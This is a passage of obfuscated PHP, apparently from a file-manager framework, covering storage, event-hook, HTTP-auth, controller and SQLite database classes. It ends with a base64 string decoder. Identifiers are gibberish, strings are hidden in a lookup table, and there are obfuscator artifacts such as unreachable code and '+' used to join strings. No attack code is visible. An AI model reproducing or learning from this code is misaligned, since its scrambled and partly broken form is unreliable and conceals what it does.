$this->fileOutLink($BÍÂ¬£†µ); } public function fileOutImageServer($a©áâ˜â­è, $bÅ‚÷ŒÂÅ = 250) { parent::fileOutImage($a©áâ˜â­è, $bÅ‚÷ŒÂÅ); } public function hashMd5($EÏÅ¾š›¸ù) { $dè®™Ö‚Î± =& $_SERVER[åÌÛ»ô¢‚ö™]; $BôæÈÓî = $this->objectMeta($EÏÅ¾š›¸ù); return isset($BôæÈÓî[$dè®™Ö‚Î±[214]]) ? $BôæÈÓî[$dè®™Ö‚Î±[214]] : !1; $BÑŸ„÷±ö² = $this->link($EÏÅ¾š›¸ù, $dè®™Ö‚Î±[1255]); } public function size($Bøèß²ŸÉ¯) { $aì¢âñ£æÙ = $this->objectMeta($Bøèß²ŸÉ¯); return $aì¢âñ£æÙ ? $aì¢âñ£æÙ[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function info($dƒ˜Üàæƒğ) { if ($this->isFolder($dƒ˜Üàæƒğ)) { return $this->folderInfo($dƒ˜Üàæƒğ); } else { if ($this->isFile($dƒ˜Üàæƒğ)) { return $this->fileInfo($dƒ˜Üàæƒğ); } } return !1; } public function exist($c©Æ”Í¨) { return $this->isFile($c©Æ”Í¨) || $this->isFolder($c©Æ”Í¨); } public function isFile($EĞµ¤¹Š…­) { return !$this->isFolder($EĞµ¤¹Š…­) && $this->objectMeta($EĞµ¤¹Š…­); } public function isFolder($dì¨²ï„† ) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][205], $dì¨²ï„† ); } protected function objectMeta($EßòÈ×µÄ) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][206], $EßòÈ×µÄ); } protected function _objectMeta($B ˜èàâµ) { $Fö¦¹…¡Šœ =& $_SERVER[åÌÛ»ô¢‚ö™]; list($cÉÏËƒóÍ‡, $a£»ºîË¥â) = $this->bucketManager->stat($this->bucket, $B ˜èàâµ); if ($cÉÏËƒóÍ‡) { $cÉÏËƒóÍ‡[$Fö¦¹…¡Šœ[77]] = intval($cÉÏËƒóÍ‡[$Fö¦¹…¡Šœ[1240]]); } return $cÉÏËƒóÍ‡; } protected function _isFolder($a‘½Î¿ñÜŸ) { $F†öìÈæŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($a‘½Î¿ñÜŸ == $F†öìÈæŒ[33] || $a‘½Î¿ñÜŸ == $F†öìÈæŒ[8]) { return !0; } list($b“‚‡¤¤—, $côôŒª–®Å) = $this->bucketManager->listFiles($this->bucket, trim($a‘½Î¿ñÜŸ, $F†öìÈæŒ[8]) . $F†öìÈæŒ[8], $F†öìÈæŒ[33], 1, $F†öìÈæŒ[8]); return !empty($b“‚‡¤¤—[$F†öìÈæŒ[1243]]) || !empty($b“‚‡¤¤—[$F†öìÈæŒ[1244]]) ? !0 : !1; } } goto DÏ¿œ; B‰¦‹š…’¿: function getimagesize_io($fßÊï‰è‡, &$D„¾ÅÎ½—— = false) { $AÂ‡¼½Û‰ì = StreamWrapperIO::read($fßÊï‰è‡, 0, 1024 * 64); $fßÊï‰è‡ = $_SERVER[åÌÛ»ô¢‚ö™][1781] . base64_encode($AÂ‡¼½Û‰ì); return getimagesize($fßÊï‰è‡, $D„¾ÅÎ½——); } class Hook { private static $events = array(); public static function get($f‰˜çìà¿ = false) { if (!$f‰˜çìà¿) { return self::$events; } else { return self::$events[$f‰˜çìà¿]; } } public static function apply($f‘œ£Úù†, $EÔï°«»Óù = array()) { $F÷Ùä…‡…ô = ActionApply($f‘œ£Úù†, $EÔï°«»Óù); if (is_string($f‘œ£Úù†)) { Hook::trigger($f‘œ£Úù†); } return $F÷Ùä…‡…ô; } public static function bind($Fã•ëå—ÓÕ, $AÏ®éÛ‚½“, $bÀ¶’Š®¦ = false) { $eç÷Ü† =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset(self::$events[$Fã•ëå—ÓÕ])) { self::$events[$Fã•ëå—ÓÕ] = array(); } self::$events[$Fã•ëå—ÓÕ][] = array($eç÷Ü†[1782] => $AÏ®éÛ‚½“, $eç÷Ü†[1783] => $bÀ¶’Š®¦, $eç÷Ü†[1784] => 0); } public static function once($D—òó”âçŠ, $B‡Íêó•¹ù) { self::bind($D—òó”âçŠ, $B‡Íêó•¹ù, !0); } public static function unbind($CÓŞÄë³ê, $aÁÚ‹Š»¢¤ = false) { if (!$aÁÚ‹Š»¢¤) { self::$events[$CÓŞÄë³ê] = array(); return; } $E¥´í„Íñ• = self::$events[$CÓŞÄë³ê]; self::$events[$CÓŞÄë³ê] = array(); if (!is_array($E¥´í„Íñ•)) { return; } for ($cæŒ¢ßí’ß = 0; $cæŒ¢ßí’ß < count($E¥´í„Íñ•); $cæŒ¢ßí’ß++) { if ($E¥´í„Íñ•[$cæŒ¢ßí’ß][$_SERVER[åÌÛ»ô¢‚ö™][1782]] == $aÁÚ‹Š»¢¤) { continue; } self::$events[$CÓŞÄë³ê][] = $E¥´í„Íñ•[$cæŒ¢ßí’ß]; } } public static function filter($e ®ÉÇÍ¢, $A¯¿­æ—Š) { goto dğÇ˜–Êğ; D‰î¬êÖö§: $AÑæ¼ìğæ© = $A‘·«Ê‡©[$e ®ÉÇÍ¢]; $Cº‡ØŞÊÙ = $A¯¿­æ—Š; if (!is_array($AÑæ¼ìğæ©) || count($AÑæ¼ìğæ©) == 0) { return $Cº‡ØŞÊÙ; } goto cØãòò±áƒ; dğÇ˜–Êğ: $aêŒÍ‹¯Ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‘·«Ê‡© = self::$events; if (!isset($A‘·«Ê‡©[$e ®ÉÇÍ¢])) { return $A¯¿­æ—Š; } goto D‰î¬êÖö§; cØãòò±áƒ: for ($dö¹ÙÒŠ = 0; $dö¹ÙÒŠ < count($AÑæ¼ìğæ©); $dö¹ÙÒŠ++) { $Aˆ†Àˆ­â = $AÑæ¼ìğæ©[$dö¹ÙÒŠ]; if ($Aˆ†Àˆ­â[$aêŒÍ‹¯Ô[1783]] && $Aˆ†Àˆ­â[$aêŒÍ‹¯Ô[1784]] > 1) { continue; } self::$events[$e ®ÉÇÍ¢][$dö¹ÙÒŠ][$aêŒÍ‹¯Ô[1784]] = $Aˆ†Àˆ­â[$aêŒÍ‹¯Ô[1784]] + 1; $a±†èô‚¢Œ = self::apply($Aˆ†Àˆ­â[$aêŒÍ‹¯Ô[1782]], array($Cº‡ØŞÊÙ)); if (gettype($a±†èô‚¢Œ) == gettype($Cº‡ØŞÊÙ)) { $Cº‡ØŞÊÙ = $a±†èô‚¢Œ; } } return $Cº‡ØŞÊÙ; goto cÅ¼õÃÖè; cÅ¼õÃÖè: } public static function trigger($c÷è´ÀõÒô) { goto DÓ’ÍÒñ¾É; DÓ’ÍÒñ¾É: $BÊ­µ­„ó =& $_SERVER[åÌÛ»ô¢‚ö™]; $AŒœè¨âàà = self::$events; $EŠä§Ş‰½ = !1; goto d™¾Îå¤ƒ; dÇÉ‡¯Îšİ: $E„ÛÛì‘é = func_get_args(); array_shift($E„ÛÛì‘é); for ($fŠ¬ÍÆøÃ = 0; $fŠ¬ÍÆøÃ < count($bá½šĞ·ß); $fŠ¬ÍÆøÃ++) { $D„Ü©Š„Ëæ = $bá½šĞ·ß[$fŠ¬ÍÆøÃ]; if ($D„Ü©Š„Ëæ[$BÊ­µ­„ó[1783]] && $D„Ü©Š„Ëæ[$BÊ­µ­„ó[1784]] > 1) { continue; } if (defined($BÊ­µ­„ó[1785]) && GLOBAL_LOG_HOOK) { write_log($c÷è´ÀõÒô . $BÊ­µ­„ó[1786] . $D„Ü©Š„Ëæ[$BÊ­µ­„ó[1782]], $BÊ­µ­„ó[1787]); } self::$events[$c÷è´ÀõÒô][$fŠ¬ÍÆøÃ][$BÊ­µ­„ó[1784]] = $D„Ü©Š„Ëæ[$BÊ­µ­„ó[1784]] + 1; $c¬´ÏºÚµ£ = self::apply($D„Ü©Š„Ëæ[$BÊ­µ­„ó[1782]], $E„ÛÛì‘é); if (defined($BÊ­µ­„ó[1785]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $BÊ­µ­„ó[1787]); if ($D„Ü©Š„Ëæ[$BÊ­µ­„ó[1784]] == 200) { $Cç°ÊœÃ·Ü = is_array($D„Ü©Š„Ëæ[$BÊ­µ­„ó[1782]]) ? json_encode_force($D„Ü©Š„Ëæ[$BÊ­µ­„ó[1782]]) : $D„Ü©Š„Ëæ[$BÊ­µ­„ó[1782]]; write_log($BÊ­µ­„ó[1788] . $c÷è´ÀõÒô . $BÊ­µ­„ó[1789] . $Cç°ÊœÃ·Ü, $BÊ­µ­„ó[1790]); } } $EŠä§Ş‰½ = is_null($c¬´ÏºÚµ£) ? $EŠä§Ş‰½ : $c¬´ÏºÚµ£; } goto B¿ï±Ÿ¡¢ñ; B¿ï±Ÿ¡¢ñ: return $EŠä§Ş‰½; goto D¢äæ„‡“î; d™¾Îå¤ƒ: if (!isset($AŒœè¨âàà[$c÷è´ÀõÒô])) { return $EŠä§Ş‰½; } $bá½šĞ·ß = $AŒœè¨âàà[$c÷è´ÀõÒô]; if (!is_array($bá½šĞ·ß) || count($bá½šĞ·ß) == 0) { return $EŠä§Ş‰½; } goto dÇÉ‡¯Îšİ; D¢äæ„‡“î: } } class HttpAuth { public static function get() { $b™ÜÜĞøä› =& $_SERVER[åÌÛ»ô¢‚ö™]; $bŒªî‚ÒÂ = $b™ÜÜĞøä›[33]; $BÒĞäŸ³… = $b™ÜÜĞøä›[33]; if (isset($_SERVER[$b™ÜÜĞøä›[1791]])) { $bŒªî‚ÒÂ = $_SERVER[$b™ÜÜĞøä›[1791]]; $BÒĞäŸ³… = $_SERVER[$b™ÜÜĞøä›[1792]]; } elseif (isset($_SERVER[$b™ÜÜĞøä›[1793]])) { $cå®İ–™´ = $_SERVER[$b™ÜÜĞøä›[1793]]; if (strpos(strtolower($cå®İ–™´), $b™ÜÜĞøä›[1794]) === 0) { $f÷ÑÅ»ÄŒ = explode($b™ÜÜĞøä›[4], base64_decode(substr($cå®İ–™´, 6))); $bŒªî‚ÒÂ = isset($f÷ÑÅ»ÄŒ[0]) ? $f÷ÑÅ»ÄŒ[0] : $b™ÜÜĞøä›[33]; $BÒĞäŸ³… = isset($f÷ÑÅ»ÄŒ[1]) ? $f÷ÑÅ»ÄŒ[1] : 0; } } return array($b™ÜÜĞøä›[560] => $bŒªî‚ÒÂ, $b™ÜÜĞøä›[919] => $BÒĞäŸ³…); } public static function error() { goto c½áÄš¡¬¼; d±âÜ¡—“Ï: header($b±ÏÍ×¼Ùª[1797]); header($b±ÏÍ×¼Ùª[1798]); header($b±ÏÍ×¼Ùª[1289]); goto Eˆ¸¯•ƒ¹Ş; c½áÄš¡¬¼: $b±ÏÍ×¼Ùª =& $_SERVER[åÌÛ»ô¢‚ö™]; header($b±ÏÍ×¼Ùª[1795]); header($b±ÏÍ×¼Ùª[1796]); goto d±âÜ¡—“Ï; Eˆ¸¯•ƒ¹Ş: die; goto A¡¸˜ë­Û; A¡¸˜ë­Û: } public static function make($C‰­´‘Ã‰±, $a°°éŞéŠ¦) { $cÀÃåó×¶š =& $_SERVER[åÌÛ»ô¢‚ö™]; return $cÀÃåó×¶š[1799] + base64_encode($C‰­´‘Ã‰± . $cÀÃåó×¶š[4] . $a°°éŞéŠ¦); } } goto EÒòâÙÔˆ®; Aï¢¾¥»Éì: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto aˆ±ÏÅŸª¼; A²ËÎ„×Ò: $this->in =& $in; $this->values[$Dªè…±¯ß‡[6]] =& $config; $this->values[$Dªè…±¯ß‡[7]] =& $in; goto c»ë½áÖâè; aˆ±ÏÅŸª¼: $Dªè…±¯ß‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; global $in, $config; $this->config =& $config; goto A²ËÎ„×Ò; c»ë½áÖâè: $this->tpl = TEMPLATE . MOD . $Dªè…±¯ß‡[8]; $this->_classObjectID = mt_rand(0, 10000); goto D‚¹¯ï—„; D‚¹¯ï—„: } public function loadClass($fŒë¦ôƒò¼) { if (1 === func_num_args()) { $this->{$fŒë¦ôƒò¼} = new $fŒë¦ôƒò¼(); } else { $aŞ˜±Šİâ‚ = new ReflectionClass($fŒë¦ôƒò¼); $f ¸Ğƒ‘åÁ = func_get_args(); array_shift($f ¸Ğƒ‘åÁ); $this->{$fŒë¦ôƒò¼} = $aŞ˜±Šİâ‚->newInstanceArgs($f ¸Ğƒ‘åÁ); } return $this->{$fŒë¦ôƒò¼}; } protected function assign($eÁ¶ºíÖà·, $eªƒÃµÈï²) { $this->values[$eÁ¶ºíÖà·] = $eªƒÃµÈï²; } protected function display($CŒØÏ‡Ä¨ï) { ob_end_clean(); extract($this->values); require $this->tpl . $CŒØÏ‡Ä¨ï; } } class DbSqliteBase extends Db { public function __construct($CïğÛìö“í = '') { $fë‹‰õÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!extension_loaded($fë‹‰õÆ[9])) { think_exception(think_lang($fë‹‰õÆ[10]) . $fë‹‰õÆ[11]); } if (!empty($CïğÛìö“í)) { if (!isset($CïğÛìö“í[$fë‹‰õÆ[12]])) { $CïğÛìö“í[$fë‹‰õÆ[12]] = 438; } $this->config = $CïğÛìö“í; if (empty($this->config[$fë‹‰õÆ[13]])) { $this->config[$fë‹‰õÆ[13]] = array(); } } } public function connect($c‚¸…Ÿ»ÜÀ = '', $E×ê¤ÒŒ¥ = 0) { $f¤©Ô³Î±Û =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->linkID[$E×ê¤ÒŒ¥])) { goto cÙ’ÀåïÍš; f‹©Ñ¶õãÂ: $this->linkID[$E×ê¤ÒŒ¥] = $F°ˆÑµ”ÔÕ($c‚¸…Ÿ»ÜÀ[$f¤©Ô³Î±Û[17]], $c‚¸…Ÿ»ÜÀ[$f¤©Ô³Î±Û[12]]); if (!$this->linkID[$E×ê¤ÒŒ¥]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto fééÂ„éæš; cÙ’ÀåïÍš: if (empty($c‚¸…Ÿ»ÜÀ)) { $c‚¸…Ÿ»ÜÀ = $this->config; } $E„ò¥…ÊöÌ = !empty($c‚¸…Ÿ»ÜÀ[$f¤©Ô³Î±Û[13]][$f¤©Ô³Î±Û[14]]) ? $c‚¸…Ÿ»ÜÀ[$f¤©Ô³Î±Û[13]][$f¤©Ô³Î±Û[14]] : $this->pconnect; $F°ˆÑµ”ÔÕ = $E„ò¥…ÊöÌ ? $f¤©Ô³Î±Û[15] : $f¤©Ô³Î±Û[16]; goto f‹©Ñ¶õãÂ; fééÂ„éæš: @sqlite_busy_timeout($this->linkID[$E×ê¤ÒŒ¥], 30000); if (1 != think_config($f¤©Ô³Î±Û[18])) { unset($this->config); } goto C÷²‰ç¼¦‡; C÷²‰ç¼¦‡: } return $this->linkID[$E×ê¤ÒŒ¥]; } public function free() { $this->queryID = null; } public function query($bğÒù¡ƒĞ’) { goto eÎ©Ú£Ì²; eÎ©Ú£Ì²: $c…‰…ÍáÙ· =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aâÀ‚£Ï; aâÀ‚£Ï: $this->queryStr = $bğÒù¡ƒĞ’; if ($this->queryID) { $this->free(); } think_action_status($c…‰…ÍáÙ·[19], 1); goto E‘»™Õ›´; E‘»™Õ›´: think_status($c…‰…ÍáÙ·[20]); $this->queryID = sqlite_query($this->_linkID, $bğÒù¡ƒĞ’); $this->debug(); goto Bß…‚Ú¯Öë; Bß…‚Ú¯Öë: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $b˜»ˆ¨¡ = $this->getAll(); return $b˜»ˆ¨¡; } goto A×ˆ™Ó”‚«; A×ˆ™Ó”‚«: } public function execute($A²„ãÉÖ†…) { goto f–º•÷£è; a•èÙ¾…ÁË: if (!1 === $bİìÕ½ä…) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto bŸÍ¼´æ¼é; f–º•÷£è: $D¢˜„¶æºó =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b¯äë“åò©; b¯äë“åò©: $this->queryStr = $A²„ãÉÖ†…; if ($this->queryID) { $this->free(); } think_action_status($D¢˜„¶æºó[21], 1); goto Dµ³ÃïìÂ; Dµ³ÃïìÂ: think_status($D¢˜„¶æºó[20]); $bİìÕ½ä… = sqlite_exec($this->_linkID, $A²„ãÉÖ†…); $this->debug(); goto a•èÙ¾…ÁË; bŸÍ¼´æ¼é: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[åÌÛ»ô¢‚ö™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eº§ø¥ìİ¨ = sqlite_query($this->_linkID, $_SERVER[åÌÛ»ô¢‚ö™][23]); if (!$Eº§ø¥ìİ¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eî¦øˆ‘¹Î = sqlite_query($this->_linkID, $_SERVER[åÌÛ»ô¢‚ö™][24]); if (!$Eî¦øˆ‘¹Î) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eæƒÆìÕÆå = array(); if ($this->numRows > 0) { for ($C‹ñİ¸ÑÌğ = 0; $C‹ñİ¸ÑÌğ < $this->numRows; $C‹ñİ¸ÑÌğ++) { $eæƒÆìÕÆå[$C‹ñİ¸ÑÌğ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eæƒÆìÕÆå; } public function getFields($dÉŒµğÂ¸Ï) { $D‚Š÷È«‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÚô–ªœ® = $this->query($D‚Š÷È«‰[25] . $dÉŒµğÂ¸Ï . $D‚Š÷È«‰[26]); $C¯äÚ‚Û·ø = array(); if ($EÚô–ªœ®) { foreach ($EÚô–ªœ® as $aæ‡àÃÈÄ => $F¿¤Éï­á) { $C¯äÚ‚Û·ø[$F¿¤Éï­á[$D‚Š÷È«‰[27]]] = array($D‚Š÷È«‰[28] => $F¿¤Éï­á[$D‚Š÷È«‰[27]], $D‚Š÷È«‰[29] => $F¿¤Éï­á[$D‚Š÷È«‰[30]], $D‚Š÷È«‰[31] => (bool) ($F¿¤Éï­á[$D‚Š÷È«‰[32]] === $D‚Š÷È«‰[33]), $D‚Š÷È«‰[34] => $F¿¤Éï­á[$D‚Š÷È«‰[35]], $D‚Š÷È«‰[36] => strtolower($F¿¤Éï­á[$D‚Š÷È«‰[37]]) == $D‚Š÷È«‰[38], $D‚Š÷È«‰[39] => strtolower($F¿¤Éï­á[$D‚Š÷È«‰[40]]) == $D‚Š÷È«‰[41]); } } return $C¯äÚ‚Û·ø; } public function getTables($DÂº÷ŞêŠø = '') { $C°ÊĞ½œÈƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¾Ò±íÈÔ = $this->query($C°ÊĞ½œÈƒ[42] . $C°ÊĞ½œÈƒ[43] . $C°ÊĞ½œÈƒ[44]); $DÓë³ª»æ‘ = array(); foreach ($e¾Ò±íÈÔ as $C”¾ù©Í¼ƒ => $Cõ¸‚‘¶£») { $DÓë³ª»æ‘[$C”¾ù©Í¼ƒ] = current($Cõ¸‚‘¶£»); } return $DÓë³ª»æ‘; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $cĞ¬…ÈíÀÁ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bá¬°óÉ»˜ = sqlite_last_error($this->_linkID); $this->error = $Bá¬°óÉ»˜ . $cĞ¬…ÈíÀÁ[4] . sqlite_error_string($Bá¬°óÉ»˜); if ($cĞ¬…ÈíÀÁ[33] != $this->queryStr) { $this->error .= LNG($cĞ¬…ÈíÀÁ[45]) . $this->queryStr; } think_trace($this->error, $cĞ¬…ÈíÀÁ[33], $cĞ¬…ÈíÀÁ[46]); return $this->error; } public function escapeString($BŒ‚Ã„ëÂ) { return sqlite_escape_string($BŒ‚Ã„ëÂ); } public function parseLimit($AÉ£ÖœÔ”ƒ) { $eÆ¶òß¿¬À =& $_SERVER[åÌÛ»ô¢‚ö™]; $dŒÉÈ˜‘ãÙ = $eÆ¶òß¿¬À[33]; if (!empty($AÉ£ÖœÔ”ƒ)) { $AÉ£ÖœÔ”ƒ = explode($eÆ¶òß¿¬À[47], $AÉ£ÖœÔ”ƒ); if (count($AÉ£ÖœÔ”ƒ) > 1) { $dŒÉÈ˜‘ãÙ .= $eÆ¶òß¿¬À[48] . $AÉ£ÖœÔ”ƒ[1] . $eÆ¶òß¿¬À[49] . $AÉ£ÖœÔ”ƒ[0] . $eÆ¶òß¿¬À[50]; } else { $dŒÉÈ˜‘ãÙ .= $eÆ¶òß¿¬À[48] . $AÉ£ÖœÔ”ƒ[0] . $eÆ¶òß¿¬À[50]; } } return $dŒÉÈ˜‘ãÙ; } } class DbSqlite3Base extends Db { public function __construct($D‚ªÀ‡¢Ã‚ = '') { $EÇ‹—Š¦Ë— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!class_exists($EÇ‹—Š¦Ë—[51])) { think_exception(think_lang($EÇ‹—Š¦Ë—[10]) . $EÇ‹—Š¦Ë—[52]); } if (!empty($D‚ªÀ‡¢Ã‚)) { if (!isset($D‚ªÀ‡¢Ã‚[$EÇ‹—Š¦Ë—[12]])) { $D‚ªÀ‡¢Ã‚[$EÇ‹—Š¦Ë—[12]] = 438; } $this->config = $D‚ªÀ‡¢Ã‚; if (empty($this->config[$EÇ‹—Š¦Ë—[13]])) { $this->config[$EÇ‹—Š¦Ë—[13]] = array(); } } } public function connect($C£Ëí‡ƒ› = '', $dğñÂ½´–¬ = 0) { $D¢†¨è»ø =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->linkID[$dğñÂ½´–¬])) { if (empty($C£Ëí‡ƒ›)) { $C£Ëí‡ƒ› = $this->config; } $this->linkID[$dğñÂ½´–¬] = new SQLite3($C£Ëí‡ƒ›[$D¢†¨è»ø[17]]); if (!$this->linkID[$dğñÂ½´–¬]) { think_exception($this->linkID[$dğñÂ½´–¬]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dğñÂ½´–¬]->busyTimeout(30000); if (1 != think_config($D¢†¨è»ø[18])) { unset($this->config); } } return $this->linkID[$dğñÂ½´–¬]; } public function free() { $this->queryID = null; } public function query($cŒå°×É) { goto AÏ’¥‘¤ ; cÓˆ©ƒŠŠÊ: think_status($f“ƒÏ÷¶ã¿[20]); $this->queryID = $this->_linkID->query($cŒå°×É); $this->debug(); goto BËÄ•¨öŒ; BËÄ•¨öŒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bƒ…ŒŞ‹¢· = $this->getAll(); $this->numRows = count($bƒ…ŒŞ‹¢·); return $bƒ…ŒŞ‹¢·; } goto F«ãâ‘»Õà; AÏ’¥‘¤ : $f“ƒÏ÷¶ã¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A¸é‡¯É¯¹; A¸é‡¯É¯¹: $this->queryStr = $cŒå°×É; if ($this->queryID) { $this->free(); } think_action_status($f“ƒÏ÷¶ã¿[19], 1); goto cÓˆ©ƒŠŠÊ; F«ãâ‘»Õà: } public function execute($eÊíä¢ìæÊ) { goto eÒ§’Œïæ; Dš•”Š•¡Œ: if (!1 === $B¹ˆâº—§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto BÈŒ÷¯ˆ÷; Aæíİ‘Ü¤…: think_status($F†çø›ğœ[20]); $B¹ˆâº—§ = $this->_linkID->exec($eÊíä¢ìæÊ); $this->debug(); goto Dš•”Š•¡Œ; eÒ§’Œïæ: $F†çø›ğœ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e­£ÆóñÙÌ; e­£ÆóñÙÌ: $this->queryStr = $eÊíä¢ìæÊ; if ($this->queryID) { $this->free(); } think_action_status($F†çø›ğœ[21], 1); goto Aæíİ‘Ü¤…; BÈŒ÷¯ˆ÷: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[åÌÛ»ô¢‚ö™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FãêšŸÛº² = $this->_linkID->query($_SERVER[åÌÛ»ô¢‚ö™][23]); if (!$FãêšŸÛº²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÕëÂšëÎ = $this->_linkID->query($_SERVER[åÌÛ»ô¢‚ö™][24]); if (!$FÕëÂšëÎ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f¾²ÈÀïÜ = array(); while ($c«ñâ›ô»Í = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $f¾²ÈÀïÜ[] = $c«ñâ›ô»Í; } $this->queryID->reset(); return $f¾²ÈÀïÜ; } public function getFields($CéšöÄœ½‘) { $F¸°Œ´¡º­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÆ´¶Ù†² = $this->query($F¸°Œ´¡º­[25] . $CéšöÄœ½‘ . $F¸°Œ´¡º­[26]); $C„¹·¬‘‡è = array(); if ($bÆ´¶Ù†²) { foreach ($bÆ´¶Ù†² as $C¯Óâ»Äêá => $dÅïöÚ¢Šõ) { $C„¹·¬‘‡è[$dÅïöÚ¢Šõ[$F¸°Œ´¡º­[28]]] = array($F¸°Œ´¡º­[28] => $dÅïöÚ¢Šõ[$F¸°Œ´¡º­[28]], $F¸°Œ´¡º­[29] => $dÅïöÚ¢Šõ[$F¸°Œ´¡º­[29]], $F¸°Œ´¡º­[31] => (bool) ($dÅïöÚ¢Šõ[$F¸°Œ´¡º­[31]] === $F¸°Œ´¡º­[33]), $F¸°Œ´¡º­[34] => $dÅïöÚ¢Šõ[$F¸°Œ´¡º­[53]], $F¸°Œ´¡º­[36] => (bool) $dÅïöÚ¢Šõ[$F¸°Œ´¡º­[54]], $F¸°Œ´¡º­[39] => (bool) $dÅïöÚ¢Šõ[$F¸°Œ´¡º­[54]]); } } return $C„¹·¬‘‡è; } public function getTables($dÏ”ñÅˆï÷ = '') { $a¶Š»³×ƒ­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cöùëÉ÷«ª = $this->query($a¶Š»³×ƒ­[42] . $a¶Š»³×ƒ­[43] . $a¶Š»³×ƒ­[44]); $bÃØêÒÊÓè = array(); foreach ($cöùëÉ÷«ª as $a‰­ù¼İŞê => $FÏº·¹¨çŞ) { $bÃØêÒÊÓè[$a‰­ù¼İŞê] = current($FÏº·¹¨çŞ); } return $bÃØêÒÊÓè; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Bí™œ®§·« =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->error = $this->_linkID->lastErrorMsg(); if ($Bí™œ®§·«[33] != $this->queryStr) { $this->error .= LNG($Bí™œ®§·«[45]) . $this->queryStr; } think_trace($this->error, $Bí™œ®§·«[33], $Bí™œ®§·«[46]); return $this->error; } public function escapeString($dİÉ²ãÊó“) { $F§â™İã« =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->_linkID) { return $this->_linkID->escapeString($dİÉ²ãÊó“); } return str_ireplace($F§â™İã«[55], $F§â™İã«[56], $dİÉ²ãÊó“); } public function parseLimit($Aƒ¾“ôé‘¥) { $A¶ğªù²© =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÆˆçĞµÁ = $A¶ğªù²©[33]; if (!empty($Aƒ¾“ôé‘¥)) { $Aƒ¾“ôé‘¥ = explode($A¶ğªù²©[47], $Aƒ¾“ôé‘¥); if (count($Aƒ¾“ôé‘¥) > 1) { $FÆˆçĞµÁ .= $A¶ğªù²©[48] . $Aƒ¾“ôé‘¥[1] . $A¶ğªù²©[49] . $Aƒ¾“ôé‘¥[0] . $A¶ğªù²©[50]; } else { $FÆˆçĞµÁ .= $A¶ğªù²©[48] . $Aƒ¾“ôé‘¥[0] . $A¶ğªù²©[50]; } } return $FÆˆçĞµÁ; } } goto F’“Ûø¹»¾; eİ×ĞÜÙ¢—: if (!function_exists('_kodDe')) { function _kodDe($CØìáÅ©š) { $CØìáÅ©š = base64_decode($CØìáÅ©š); $eÅ¢ çÜÊÕ = strlen($CØìáÅ©š); $fÈ¤†®ƒäÏ = ''; $F¬áµòùö = ord($CØìáÅ©š[0]) - 30; for ($bÌ¦ßÖ÷Ãœ = 1; $bÌ¦ßÖ÷Ãœ < $eÅ¢ çÜÊÕ; $bÌ¦ßÖ÷Ãœ += 2) { if ($bÌ¦ßÖ÷Ãœ + 1 < $eÅ¢ çÜÊÕ) { $fÈ¤†®ƒäÏ .= chr(ord($CØìáÅ©š[$bÌ¦ßÖ÷Ãœ + 1]) + $F¬áµòùö); $fÈ¤†®ƒäÏ .= chr(ord($CØìáÅ©š[$bÌ¦ßÖ÷Ãœ]) + $F¬áµòùö); } else { $fÈ¤†®ƒäÏ .= chr(ord($CØìáÅ©š[$bÌ¦ßÖ÷Ãœ]) + $F¬áµòùö); } } return $fÈ¤†®ƒäÏ; } } define("\xe5\xcc\xdb\xbb\xf4\xa2\x82\xf6\x99\x8e", "\xda\x9e\xb5\xe8\xc8\x9a\xcb\xcc"); $_SERVER[åÌÛ»ô¢‚ö™] = 